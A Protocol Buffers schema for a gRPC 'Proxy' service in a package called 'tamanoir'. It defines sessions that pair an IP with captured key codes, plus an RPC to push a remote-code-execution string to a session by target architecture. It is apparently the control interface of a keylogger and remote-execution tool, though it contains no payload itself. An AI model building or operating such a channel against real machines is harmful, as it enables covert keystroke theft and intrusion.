syntax = "proto3";

package tamanoir;


message NoArgs {}
message StatusResponse {
  bool success=1;
  string err=2;
}

message ListSessionsResponse {
  repeated SessionResponse sessions = 1;
}

message SessionResponse {
  string ip =1;
  repeated uint32 key_codes=2; 
}
message SetSessionRceRequest {
  string ip=1;
  string rce=2;
  string target_arch=3; 
}

service Proxy {
  rpc ListSessions (NoArgs) returns ( ListSessionsResponse) {}
  rpc WatchSessions (NoArgs) returns ( stream SessionResponse) {}
  rpc SetSessionRce (SetSessionRceRequest) returns (NoArgs) {}
}